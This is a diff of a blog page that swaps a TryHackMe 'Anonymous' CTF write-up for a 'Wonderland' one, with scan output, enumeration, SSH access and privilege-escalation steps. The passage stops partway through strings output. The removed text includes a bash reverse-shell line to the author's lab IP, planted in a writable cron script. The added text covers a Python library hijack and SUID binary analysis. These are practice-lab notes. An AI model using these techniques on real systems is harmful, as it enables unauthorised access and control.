@@ -5,17 +5,17 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:Siva Rajendran]">
-<meta name="description" content="The following write up is for the machine: Anonymous
+<meta name="description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
-<link rel="canonical" href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/" />
+<link rel="canonical" href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/" />
 
 
     <title>
         
-            Tryhackme- Anonymous Writeup :: 0xSh1v4 Infosec Blog  — Writeups, CTFs
+            Tryhackme- Wonderland Writeup :: 0xSh1v4 Infosec Blog  — Writeups, CTFs
         
     </title>
 
@@ -42,12 +42,12 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 
 
 
-<meta itemprop="name" content="Tryhackme- Anonymous Writeup">
-<meta itemprop="description" content="The following write up is for the machine: Anonymous
+<meta itemprop="name" content="Tryhackme- Wonderland Writeup">
+<meta itemprop="description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.">
-<meta itemprop="datePublished" content="2020-09-01T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2020-09-01T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1536">
+<meta itemprop="datePublished" content="2020-09-12T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-09-12T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1435">
 <meta itemprop="image" content="https://0xSh1v4.github.io"/>
 
 
@@ -57,20 +57,20 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xSh1v4.github.io"/>
 
-<meta name="twitter:title" content="Tryhackme- Anonymous Writeup"/>
-<meta name="twitter:description" content="The following write up is for the machine: Anonymous
+<meta name="twitter:title" content="Tryhackme- Wonderland Writeup"/>
+<meta name="twitter:description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas."/>
 
 
 
-    <meta property="og:title" content="Tryhackme- Anonymous Writeup" />
-<meta property="og:description" content="The following write up is for the machine: Anonymous
+    <meta property="og:title" content="Tryhackme- Wonderland Writeup" />
+<meta property="og:description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/" />
+<meta property="og:url" content="https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/" />
 <meta property="og:image" content="https://0xSh1v4.github.io"/>
-<meta property="article:published_time" content="2020-09-01T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-09-01T00:00:00+00:00" />
+<meta property="article:published_time" content="2020-09-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-09-12T00:00:00+00:00" />
 
 
 
@@ -78,7 +78,7 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 
 
 
-    <meta property="article:published_time" content="2020-09-01 00:00:00 &#43;0000 UTC" />
+    <meta property="article:published_time" content="2020-09-12 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -144,7 +144,7 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        8 minutes reading time
+        7 minutes reading time
 
         
       </p>
@@ -152,362 +152,297 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 
     <article>
       <h1 class="post-title">
-        <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/">Tryhackme- Anonymous Writeup</a>
+        <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/">Tryhackme- Wonderland Writeup</a>
       </h1>
 
       
 
       <div class="post-content">
-        <p>The following write up is for the machine: Anonymous</p>
+        <p>The following write up is for the machine: Wonderland</p>
 <p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
 <h2 id="synopsis">Synopsis</h2>
-<p><a href="https://tryhackme.com/room/anonymous">Anonymous</a> is the typical boot2root machine where we need to find two flags in the machine. It comes with an interesting part that explains the exploitation via FTP server to get the reverse shell by which we can obtain a user flag.And the privilege escalation done via weak SUID permissions by which we will obtain our root flag.</p>
+<p><a href="https://www.tryhackme.com/room/wonderland">Wonderland</a> is a wonderful machine with lots of interesting things to learn. Especially privilege escalation part is the best so far I&rsquo;ve done, You have to escalate three times which includes different weak SUID permssion and then weak SUID Capabilities configurations which allow us to obtain the root and user flag at the end.</p>
 <h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
 <p>As usual, let us run the nmap tool to can the target network.</p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
-└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CEST
-Nmap scan report for 10.10.237.45
-Host is up (0.069s latency).
-Not shown: 996 closed ports
-PORT    STATE SERVICE     VERSION
-21/tcp  open  ftp         vsftpd 2.0.8 or later
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to ::ffff:10.9.90.133
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 4
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
-|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
-|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
-Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
-|   Computer name: anonymous
-|   NetBIOS computer name: ANONYMOUS\x00
-|   Domain name: \x00
-|   FQDN: anonymous
-|_  System time: 2020-08-27T15:07:29+00:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2020-08-27T15:07:29
-|_  start_date: N/A
+<h3 id="nmap-results">Nmap Results:</h3>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ nmap -sC -sV -oA top 10.10.20.227
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 01:37 CEST
+Nmap scan report for 10.10.20.227
+Host is up (0.081s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Follow the white rabbit.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
-</code></pre><p>From the results, we could see an allowance via anonymous ftp login and also the smb ports are open.</p>
-<p>So let&rsquo;s find what infos do we get from there.</p>
+Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
+</code></pre><p>We found only two ports (22 and 80) open for this device. We also see that ssh runs on port 22 and http on port 80 with the version (GOlang net/http server)lets find the gobuster results</p>
+<h3 id="gobuster-results">Gobuster Results:</h3>
+<p>We have obtained the below results from the gobuster.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.20.227
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.20.227
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/12 01:37:48 Starting gobuster
+===============================================================
+/img (Status: 301)
+/r (Status: 301)
+/poem (Status: 301)
+/http%3A%2F%2Fwww (Status: 301)
+/http%3A%2F%2Fyoutube (Status: 301)
+/http%3A%2F%2Fblogs (Status: 301)
+/http%3A%2F%2Fblog (Status: 301)
+/**http%3A%2F%2Fwww (Status: 301)
+/http%3A%2F%2Fcommunity (Status: 301)
+/http%3A%2F%2Fradar (Status: 301)
+/http%3A%2F%2Fjeremiahgrossman (Status: 301)
+/http%3A%2F%2Fweblog (Status: 301)
+/http%3A%2F%2Fswik (Status: 301)
+===============================================================
+2020/09/12 01:54:06 Finished
+===============================================================
+</code></pre><p>On port 80, we have the webpage.</p>
+<p>Rabbit Machine Homepage:
 <figure>
-    <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/1.png"
-         alt="Tryhackme: Anonymous machine - Download from FTP server"/> <figcaption>
-            <p>Tryhackme: Anonymous machine - Download from FTP server</p>
-        </figcaption>
-</figure>
-
-<p>Now, we have downloaded these files. lets inspect it.</p>
-<p>Now, I have downloaded these files. lets inspect it. (<strong>This is the part which learned from this machine</strong>)
-I found a bash script (clean.sh) which runs at regular intervals.
-I also ran <em>enum4linux</em> since I found some smb port 139 and 445.</p>
-<p>Read this nice article about SMB Enumeration: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">SMB-Enumeration</a></p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
-└─$ enum4linux -a 10.10.237.45                                                                         130 ⨯
-Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 27 17:22:06 2020
-
- ========================== 
-|    Target Information    |
- ========================== 
-Target ........... 10.10.237.45
-RID Range ........ 500-550,1000-1050
-Username ......... ''
-Password ......... ''
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-
-
- ==================================================== 
-|    Enumerating Workgroup/Domain on 10.10.237.45    |
- ==================================================== 
-[+] Got domain/workgroup name: WORKGROUP
-
- ============================================ 
-|    Nbtstat Information for 10.10.237.45    |
- ============================================ 
-Looking up status of 10.10.237.45
-	ANONYMOUS       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
-	ANONYMOUS       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
-	ANONYMOUS       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
-	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
-	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
-	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
-	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
-
-	MAC Address = 00-00-00-00-00-00
-
- ===================================== 
-|    Session Check on 10.10.237.45    |
- ===================================== 
-[+] Server 10.10.237.45 allows sessions using username '', password ''
-
- =========================================== 
-|    Getting domain SID for 10.10.237.45    |
- =========================================== 
-Domain Name: WORKGROUP
-Domain Sid: (NULL SID)
-[+] Can't determine if host is part of domain or part of a workgroup
-
- ====================================== 
-|    OS information on 10.10.237.45    |
- ====================================== 
-Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
-[+] Got OS info for 10.10.237.45 from smbclient: 
-[+] Got OS info for 10.10.237.45 from srvinfo:
-	ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
-	platform_id     :	500
-	os version      :	6.1
-	server type     :	0x809a03
-
- ============================= 
-|    Users on 10.10.237.45    |
- ============================= 
-index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone	Name: namelessone	Desc: 
-
-user:[namelessone] rid:[0x3eb]
-
- ========================================= 
-|    Share Enumeration on 10.10.237.45    |
- ========================================= 
-
-	Sharename       Type      Comment
-	---------       ----      -------
-	print$          Disk      Printer Drivers
-	pics            Disk      My SMB Share Directory for Pics
-	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
-SMB1 disabled -- no workgroup available
-
-[+] Attempting to map shares on 10.10.237.45
-//10.10.237.45/print$	Mapping: DENIED, Listing: N/A
-//10.10.237.45/pics	Mapping: OK, Listing: OK
-//10.10.237.45/IPC$	[E] Can't understand response:
-NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
-
- ==================================================== 
-|    Password Policy Information for 10.10.237.45    |
- ==================================================== 
-
-
-[+] Attaching to 10.10.237.45 using a NULL share
-
-[+] Trying protocol 139/SMB...
-
-[+] Found domain(s):
-
-	[+] ANONYMOUS
-	[+] Builtin
-
-[+] Password Info for Domain: ANONYMOUS
-
-	[+] Minimum password length: 5
-	[+] Password history length: None
-	[+] Maximum password age: 37 days 6 hours 21 minutes 
-	[+] Password Complexity Flags: 000000
-
-		[+] Domain Refuse Password Change: 0
-		[+] Domain Password Store Cleartext: 0
-		[+] Domain Password Lockout Admins: 0
-		[+] Domain Password No Clear Change: 0
-		[+] Domain Password No Anon Change: 0
-		[+] Domain Password Complex: 0
-
-	[+] Minimum password age: None
-	[+] Reset Account Lockout Counter: 30 minutes 
-	[+] Locked Account Duration: 30 minutes 
-	[+] Account Lockout Threshold: None
-	[+] Forced Log off Time: 37 days 6 hours 21 minutes 
-
-
-[+] Retieved partial password policy with rpcclient:
-
-Password Complexity: Disabled
-Minimum Password Length: 5
-
-
- ============================== 
-|    Groups on 10.10.237.45    |
- ============================== 
-
-[+] Getting builtin groups:
-
-[+] Getting builtin group memberships:
-
-[+] Getting local groups:
-
-[+] Getting local group memberships:
-
-[+] Getting domain groups:
-
-[+] Getting domain group memberships:
-
- ======================================================================= 
-|    Users on 10.10.237.45 via RID cycling (RIDS: 500-550,1000-1050)    |
- ======================================================================= 
-[I] Found new SID: S-1-22-1
-[I] Found new SID: S-1-5-21-2144577014-3591677122-2188425437
-[I] Found new SID: S-1-5-32
-[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
-S-1-5-32-500 *unknown*\*unknown* (8)
-S-1-5-32-501 *unknown*\*unknown* (8)
-S-1-5-32-502 *unknown*\*unknown* (8)
-S-1-5-32-503 *unknown*\*unknown* (8)
-S-1-5-32-504 *unknown*\*unknown* (8)
-S-1-5-32-505 *unknown*\*unknown* (8)
-S-1-5-32-506 *unknown*\*unknown* (8)
-S-1-5-32-507 *unknown*\*unknown* (8)
-S-1-5-32-508 *unknown*\*unknown* (8)
-S-1-5-32-509 *unknown*\*unknown* (8)
-S-1-5-32-510 *unknown*\*unknown* (8)
-S-1-5-32-511 *unknown*\*unknown* (8)
-S-1-5-32-512 *unknown*\*unknown* (8)
-S-1-5-32-544 BUILTIN\Administrators (Local Group)
-S-1-5-32-545 BUILTIN\Users (Local Group)
-S-1-5-32-546 BUILTIN\Guests (Local Group)
-S-1-5-32-547 BUILTIN\Power Users (Local Group)
-S-1-5-32-548 BUILTIN\Account Operators (Local Group)
-S-1-5-32-549 BUILTIN\Server Operators (Local Group)
-S-1-5-32-550 BUILTIN\Print Operators (Local Group)
-S-1-5-32-1000 *unknown*\*unknown* (8)
-S-1-5-32-1001 *unknown*\*unknown* (8)
-[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
-S-1-22-1-1000 Unix User\namelessone (Local User)
-[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
-S-1-5-21-2144577014-3591677122-2188425437-500 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)
-S-1-5-21-2144577014-3591677122-2188425437-513 ANONYMOUS\None (Domain Group)
-S-1-5-21-2144577014-3591677122-2188425437-514 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-515 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-516 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1001 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1002 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)
-S-1-5-21-2144577014-3591677122-2188425437-1004 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1005 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1006 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1007 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1008 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1009 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1010 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1011 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1012 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1013 *unknown*\*unknown* (8)
-S-1-5-21-2144577014-3591677122-2188425437-1014 *unknown*\*unknown* (8)
-
-
-
- ============================================= 
-|    Getting printer info for 10.10.237.45    |
- ============================================= 
-No printers returned.
-
-
-enum4linux complete on Thu Aug 27 17:29:05 2020
-</code></pre><p>From the results of <em>enum4linux</em>, I found that anonymous smbshare accessiblity is possible. But there were only image files and doesn&rsquo;t help us much.</p>
-<figure>
-    <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/2.png"
-         alt="Tryhackme: Anonymous machine - Download from SMB Share"/> <figcaption>
-            <p>Tryhackme: Anonymous machine - Download from SMB Share</p>
-        </figcaption>
-</figure>
-
-<p>Also, we have found the local users names from <em>enum4linux</em>.</p>
-<ul>
-<li>ANONYMOUS\nobody</li>
-<li>ANONYMOUS\none</li>
-<li>ANONYMOUS\namelessone</li>
-</ul>
-<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
-<p>After looking the results again, It striked me that we have a full write permission on clean.sh script which runs repeatedly and it is possible to upload our shell and get an access to the machine.</p>
-<p>we have full write permission on clean.sh file.
-<figure>
-    <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/3.png"
-         alt="Tryhackme: Anonymous machine - Append Shell Code to the sh file"/> <figcaption>
-            <p>Tryhackme: Anonymous machine - Append Shell Code to the sh file</p>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/1.png"
+         alt="Tryhackme: Wonderland machine - Homepage"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Homepage</p>
         </figcaption>
 </figure>
 </p>
-<p>So, we have append our shell script to the file</p>
-<p><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.90.133/1234 0&gt;&amp;1'</code></p>
-<p>And now we got our rev shell back connecting to the target machine.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>I have downloaded the image and tried to check if there are any infos hidden inside the image file.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ steghide --extract -sf white_rabbit_1.jpg
+Enter passphrase:
+wrote extracted data to &quot;hint.txt&quot;.                     
+
+┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ cat hint.txt
+follow the r a b b i t
+</code></pre><p>We just got this information.</p>
+<p>Further looking into /img location, I have found three image files.</p>
 <figure>
-    <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/4.png"
-         alt="Tryhackme: Anonymous machine - Low level shell with the user namelessone"/> <figcaption>
-            <p>Tryhackme: Anonymous machine - Low level shell with the user namelessone</p>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/2.png"
+         alt="Tryhackme: Wonderland machine - Image Files"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Image Files</p>
         </figcaption>
 </figure>
 
+<p>I have tried to decrypt the three, but couldn&rsquo;t find anything except the hint saying &ldquo;follow the rabbit&rdquo;.</p>
+<p>From the gobuster results, we found the /r path. So, I have tried adding /a next to /r, so it becomes /r/a and when I fulfill it according to the hint, which we got, then it will be</p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/3.png"
+         alt="Tryhackme: Wonderland machine - Follow the rabbit"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Follow the rabbit</p>
+        </figcaption>
+</figure>
+
+<p>Now, we again went to the deadend. I didn&rsquo;t know what I had to do after this.</p>
+<p>I just looked into the source and code and I saw some sensitive credentials.</p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/4.png"
+         alt="Tryhackme: Wonderland machine - Sensitive Information"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Sensitive Information</p>
+        </figcaption>
+</figure>
+
+<p>Now, I have tried to use this creds for SSH and luckily,we got the shell popped up into the machine.
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/5.png"
+         alt="Tryhackme: Wonderland machine - SSH as ALice"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - SSH as ALice</p>
+        </figcaption>
+</figure>
+</p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>Now, we have logged in as namelessone user.</p>
-<p>Lets see what SUID permission does this user have</p>
-<pre><code>namelessone@anonymous:~$ find / -perm -u=s -type f 2&gt;/dev/null
-find / -perm -u=s -type f 2&gt;/dev/null
-/snap/core/8268/bin/mount
-/snap/core/8268/bin/ping
-/snap/core/8268/bin/ping6
-/snap/core/8268/bin/su
-/bin/umount
+<p>We found the following information from the /home directory:</p>
+<pre><code>alice@wonderland:/home$ ls
+alice  hatter  rabbit  tryhackme
+alice@wonderland:/home$ ls alice/
+root.txt  walrus_and_the_carpenter.py
+alice@wonderland:/home$ ls -la alice/
+total 40
+drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
+drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
+lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
+-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
+drwx------ 2 alice alice 4096 May 25 16:37 .cache
+drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
+drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
+-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
+-rw------- 1 root  root    66 May 25 17:08 root.txt
+-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
+alice@wonderland:/home$
+</code></pre><p>So, I ran sudo -l, to see if it works.</p>
+<pre><code>alice@wonderland:/home$ sudo -l
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre><p>we found that alice can run the following script with sudo as rabbit user.</p>
+<p>Looking at the following script, we found the random python library was included.</p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/6.png"
+         alt="Tryhackme: Wonderland machine - python executable library"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - python executable library</p>
+        </figcaption>
+</figure>
+
+<p>Then, I tried to create a python file name random.py with the script and try to escalate to rabbit user. (Took a while to identify, before that I found few other ways to escalate priv but it can&rsquo;t be done from Alice user.)</p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/7.png"
+         alt="Tryhackme: Wonderland machine - Escalation to Rabbit"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Escalation to Rabbit</p>
+        </figcaption>
+</figure>
+
+<p>Just created a file name random with the following line and executed as the user rabbit to elevate the priv to rabbit.</p>
+<h2 id="post-exploitation">Post-Exploitation:</h2>
+<p>Rabbit can able to execute the teaparty file.</p>
+<pre><code>rabbit@wonderland:/home/rabbit$ ls
+teaParty
+rabbit@wonderland:/home/rabbit$ find / -perm -u=s -type f 2&gt;/dev/null
+/home/rabbit/teaParty
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/sudo
 /bin/fusermount
+/bin/umount
 /bin/ping
 /bin/mount
 /bin/su
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/snapd/snap-confine
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-/usr/bin/passwd
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">/usr/bin/env</code></pre></div>
-/usr/bin/gpasswd
-/usr/bin/newuidmap
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/bin/newgidmap
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/traceroute6.iputils
-/usr/bin/at
-</code></pre><p>The user namelessone has the <strong>ENV</strong> with <em>SUID</em> bit set.</p>
-<p>So. we can use it to elevate our privilege
-<a href="https://gtfobins.github.io/gtfobins/env/">GTFOBINS-ENV</a></p>
+rabbit@wonderland:/home/rabbit$ /home/rabbit/teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Sat, 12 Sep 2020 12:36:31 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+ok
+Segmentation fault (core dumped)
+</code></pre><p>So, It seems like we need to escalate the privilege for the user <strong>Hatter</strong>. But it has to do with this file. I have tried strace command, but haven&rsquo;t found anything interesting. So, I have downloaded the file and tried to examine it.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ strings teaParty          
+/lib64/ld-linux-x86-64.so.2
+2U~4
+libc.so.6
+setuid
+puts
+getchar
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+/bin/echo -n 'Probably by ' &amp;&amp; date --date='next hour' -R
+Ask very nicely, and I will give you some tea while you wait for him
+Segmentation fault (core dumped)
+;*3$&quot;
+GCC: (Debian 8.3.0-6) 8.3.0
+crtstuff.c
+deregister_tm_clones
